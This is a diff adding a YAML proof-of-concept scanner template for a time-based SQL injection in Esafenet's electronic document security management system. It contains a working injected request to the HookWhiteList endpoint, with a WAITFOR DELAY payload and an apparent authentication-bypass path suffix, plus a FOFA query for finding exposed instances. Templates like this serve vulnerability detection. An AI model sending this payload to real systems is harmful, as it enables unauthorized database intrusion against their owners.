@@ -1,0 +1,17 @@
+id: poc-yaml-yisaitong-esafenet-hookwhitelistservice-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 HookWhiteListservice SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: random_int(3,8)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /CDGServer3/policy/HookWhiteList;logindojojs?command=AddHookWhiteList&policyId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: status_code == 404 && contains(headers,"Path=/CDGServer3") && duration
+    > t1 && duration < t2
+transport: http
